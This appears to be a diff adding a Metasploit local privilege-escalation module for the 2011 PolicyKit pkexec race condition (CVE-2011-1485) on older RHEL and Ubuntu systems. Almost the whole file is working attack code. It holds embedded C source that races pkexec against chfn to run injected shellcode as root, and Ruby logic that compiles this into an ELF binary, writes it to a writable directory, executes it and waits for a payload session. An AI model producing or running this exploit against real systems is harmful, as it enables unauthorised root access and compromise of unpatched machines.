@@ -1,0 +1,354 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class Metasploit4 < Msf::Exploit::Local
+  Rank = GreatRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+
+  include Msf::Exploit::Local::Linux
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Linux PolicyKit Race Condition Privilege Escalation',
+      'Description'   => %q(
+        A race condition flaw was found in the PolicyKit pkexec utility and polkitd
+        daemon. A local user could use this flaw to appear as a privileged user to
+        pkexec, allowing them to execute arbitrary commands as root by running
+        those commands with pkexec.
+
+        Those vulnerable include RHEL6 prior to polkit-0.96-2.el6_0.1 and Ubuntu
+        libpolkit-backend-1 prior to 0.96-2ubuntu1.1 (10.10) 0.96-2ubuntu0.1
+        (10.04 LTS) and 0.94-1ubuntu1.1 (9.10)
+      ),
+      'License'       => MSF_LICENSE,
+      'Author'        =>
+      [
+        'xi4oyu',                           # exploit
+        '0a29406d9794e4f9b30b3c5d6702c708'  # metasploit module
+      ],
+      'Platform'       => [ 'linux'],
+      'Arch'           => [ ARCH_X86, ARCH_X86_64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'       =>
+      [
+        [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
+        [ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ]
+      ],
+      'DefaultTarget' => 0,
+      'References'    =>
+      [
+        [ 'CVE', '2011-1485' ],
+        [ 'EDB', '17942' ],
+        [ 'OSVDB', '72261' ]
+      ],
+      'DisclosureDate' => "Apr 01 2011"
+    ))
+    register_options([
+      OptString.new("WritableDir", [ true, "A directory where we can write files (must not be mounted noexec)", "/tmp" ]),
+      OptInt.new("Count", [true, "Number of attempts to win the race condition", 500 ]),
+      OptInt.new("ListenerTimeout", [true, "Number of seconds to wait for the exploit", 60]),
+      OptBool.new("DEBUG", [ true, "Make the exploit executable be verbose about what it's doing", false ])
+    ])
+  end
+
+  def executable_path
+    @executable_path ||= datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
+    @executable_path
+  end
+
+  def exploit
+    main = %q^
+/*
+* Exploit Title: pkexec Race condition (CVE-2011-1485) exploit
+* Author: xi4oyu
+* Tested on: rhel 6
+* CVE : 2011-1485
+* Linux pkexec exploit by xi4oyu , thx dm@0x557.org * Have fun~
+* U can reach us  @ http://www.wooyun.org :)
+* 0a2940: some changes
+*/
+/*
+#include <stdio.h>
+#include <limits.h>
+#include <time.h>
+#include <unistd.h>
+#include <termios.h>
+#include <sys/stat.h>
+#include <errno.h>
+#include <poll.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <string.h>
+*/
+
+#define dprintf
+
+#define NULL ((void*)0)
+
+#define MAP_PRIVATE   0x02
+#define MAP_FIXED     0x10
+#define MAP_ANONYMOUS 0x20
+#define MAP_ANON MAP_ANONYMOUS
+#define MAP_FAILED ((void *)-1)
+
+#define PROT_READ  0x1
+#define PROT_WRITE 0x2
+#define PROT_EXEC  0x4
+
+#define O_CREAT 64
+#define O_RDWR 2
+
+#define POLLRDNORM      0x0040
+
+typedef int __pid_t;
+typedef int __time_t;
+typedef
+struct {
+        long __val[2];
+} __quad_t;
+typedef __quad_t __dev_t;
+typedef long __ino_t;
+typedef unsigned long __mode_t;
+typedef long __nlink_t;
+typedef unsigned int __uid_t;
+typedef unsigned int __gid_t;
+typedef long long __off_t;
+typedef long __blksize_t;
+typedef long long __blkcnt_t;
+struct _stat_buff {
+    __dev_t st_dev;                     /* Device.  */
+    unsigned short int __pad1;
+    __ino_t st_ino;                     /* File serial number.  */
+    __mode_t st_mode;                   /* File mode.  */
+    __nlink_t st_nlink;                 /* Link count.  */
+    __uid_t st_uid;                     /* User ID of the file's owner. */
+    __gid_t st_gid;                     /* Group ID of the file's group.*/
+    __dev_t st_rdev;                    /* Device number, if device.  */
+    unsigned short int __pad2;
+    __off_t st_size;                    /* Size of file, in bytes.  */
+    __blksize_t st_blksize;             /* Optimal block size for I/O.  */
+    __blkcnt_t st_blocks;               /* Number 512-byte blocks allocated. */
+    __time_t st_atime;                  /* Time of last access.  */
+    unsigned long int st_atimensec;     /* Nscecs of last access.  */
+    __time_t st_mtime;                  /* Time of last modification.  */
+    unsigned long int st_mtimensec;     /* Nsecs of last modification.  */
+    __time_t st_ctime;                  /* Time of last status change.  */
+    unsigned long int st_ctimensec;     /* Nsecs of last status change.  */
+    unsigned long int __unused4;
+    unsigned long int __unused5;
+};
+
+struct _pollfd {
+    int   fd;         /* file descriptor */
+    short events;     /* requested events */
+    short revents;    /* returned events */
+};
+typedef unsigned long size_t;
+extern void *mmap(void *__addr, size_t __len, int __prot, int __flags, int __fd, __off_t __offset);
+extern int mprotect(void *__addr, size_t __len, int __prot);
+extern void exit(int __status);
+extern int printf(const char *__format, ...);
+extern __pid_t fork(void);
+extern __time_t time(__time_t *t);
+extern __pid_t getpid(void);
+extern __uid_t geteuid(void);
+extern void srand(unsigned int seed);
+extern int snprintf(char *str, size_t size, const char *format, ...);
+extern int pipe(int pipefd[2]);
+extern int close(int fd);
+extern void write(int fd, const void *buf, size_t count);
+extern int dup2(int oldfd, int newfd);
+extern void perror(const char *__s);
+extern void read(int fd, void *buf, size_t count);
+extern int execve(const char *filename, char *const argv[], char *const envp);
+extern int usleep(int usec);
+extern void *memset(void *s, int c, size_t n);
+extern void *memcpy(void * dst, const void *src, size_t n);
+extern int poll(struct _pollfd *fds, unsigned int nfds, int timeout);
+extern char *strstr(const char *haystack, const char *needle);
+extern int rand(void);
+extern int unlink(const char *__name);
+
+int main(int argc,char *argv[], char ** envp)
+{
+
+    __time_t tim_seed1;
+    __pid_t pid_seed2;
+    int result;
+    struct _stat_buff stat_buff;
+
+    char * chfn_path = "/usr/bin/chfn";
+    char * cmd_path = "";
+
+    char * pkexec_argv[] = {
+        "/usr/bin/pkexec",
+        "/bin/sh",
+        "-c",
+        cmd_path,
+        NULL
+    };
+    int pipe1[2];
+    int pipe2[2];
+    int pipe3[2];
+    __pid_t pid,pid2 ;
+    char * chfn_argv[] = {
+        "/usr/bin/chfn",
+        NULL
+    };
+
+    char buff[8];
+    char read_buff[4096];
+    char real_path[512];
+
+    int count = 0;
+    int flag = 0;
+    unsigned int usleep1 = 0;
+    unsigned int usleep2 = 0;
+
+    tim_seed1 = time(NULL);
+    pid_seed2 = getpid();
+    srand(tim_seed1+pid_seed2);
+
+    if(!geteuid()){
+
+      unlink(cmd_path);
+
+      SHELLCODE
+
+      int shellcode_size = 0;
+      int i;
+      unsigned long (*func)();
+      func = mmap(NULL, 0x1000,
+        PROT_READ | PROT_WRITE | PROT_EXEC,
+        MAP_PRIVATE | MAP_ANONYMOUS,
+        0, 0
+      );
+      mprotect(func, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
+      dprintf("Copying %d bytes of shellcode\n", shellcode_size);
+      //for (i = 0; i < shellcode_size; i++) {
+        //(char)func[i] = (char)shellcode[i];
+         memcpy(func,shellcode,shellcode_size);
+      //}
+      dprintf("Forking before calling shellcode: 0x%p\n", func);
+      if (fork()) {
+        exit(0);
+      }
+      func();
+    }
+
+    if(pipe(pipe1)){
+        perror("pipe");
+        exit(-2);
+    }
+
+    for(count = COUNT; count && !flag; count--){
+        dprintf("count %d usleep1 %d usleep2 %d\n",count,usleep1,usleep2);
+        pid = fork();
+        if( !pid ){
+            // Parent
+            if( !pipe(pipe2)){
+                if(!pipe(pipe3)){
+                    pid2 = fork();
+                    if(!pid2){
+                        // Parent 2
+                        close(1);
+                        close(2);
+                        close(pipe1[0]);
+                        dup2(pipe1[1],2);
+                        dup2(pipe1[1],1);
+                        close(pipe1[1]);
+                        close(pipe2[0]);
+                        close(pipe3[1]);
+                        write(pipe2[1],"\xFF",1);
+                        read(pipe3[0],&buff,1);
+                        execve(pkexec_argv[0],pkexec_argv,envp);
+                        perror("execve pkexec");
+                        exit(-3);
+                    }
+                    close(0);
+                    close(1);
+                    close(2);
+                    close(pipe2[1]);
+                    close(pipe3[0]);
+                    read(pipe2[0],&buff,1);
+                    write(pipe3[1],"\xFF",1);
+                    usleep(usleep1+usleep2);
+                    execve(chfn_argv[0],chfn_argv,envp);
+                    perror("execve setuid");
+                    exit(1);
+                }
+            }
+            perror("pipe3");
+            exit(1);
+        }
+
+        //Note: This is child, no pipe3 we use poll to monitor pipe1[0]
+        memset(pipe3,0,8);
+
+        struct _pollfd * pollfd = (struct pollfd *)(&pipe3);
+        pollfd->fd = pipe1[0];
+        pollfd->events =  POLLRDNORM;
+
+        if(poll(pollfd,1,1000) < 0){
+            perror("poll");
+            exit(1);
+        }
+
+        if(pollfd->revents & POLLRDNORM ){
+            memset(read_buff,0,4096);
+            read(pipe1[0],read_buff,4095);
+            if( strstr(read_buff,"does not match")){
+                usleep1 += 100;
+                usleep2 = rand() % 1000;
+            }else{
+                if(usleep1 > 0){
+                  usleep1 -= 100;
+                }
+            }
+        }
+    }
+    result = 0;
+    unlink(cmd_path);
+    return result;
+}
+
+^
+    main.gsub!(/SHELLCODE/, Rex::Text.to_c(payload.encoded, 64, "shellcode"))
+    main.gsub!(/shellcode_size = 0/, "shellcode_size = #{payload.encoded.length}")
+    main.gsub!(/cmd_path = ""/, "cmd_path = \"#{executable_path}\"")
+    main.gsub!(/COUNT/, datastore["Count"].to_s)
+    main.gsub!(/#define dprintf/, "#define dprintf printf") if datastore['DEBUG']
+
+    cpu = nil
+    if target['Arch'] == ARCH_X86
+      cpu = Metasm::Ia32.new
+    elsif target['Arch'] == ARCH_X86_64
+      cpu = Metasm::X86_64.new
+    end
+
+    begin
+      elf = Metasm::ELF.compile_c(cpu, main).encode_string
+    rescue
+      print_error "Metasm Encoding failed: #{$ERROR_INFO}"
+      elog "Metasm Encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
+      elog "Call stack:\n#{$ERROR_INFO.backtrace.join("\n")}"
+      return
+    end
+
+    print_status "Writing exploit executable to #{executable_path} (#{elf.length} bytes)"
+    rm_f executable_path
+    write_file(executable_path, elf)
+    output = cmd_exec("chmod +x #{executable_path}; #{executable_path}")
+    output.each_line { |line| print_debug line.chomp }
+
+    stime = Time.now.to_f
+    print_status "Starting the payload handler..."
+    until session_created? || stime + datastore['ListenerTimeout'] < Time.now.to_f
+      Rex.sleep(1)
+    end
+  end
+end
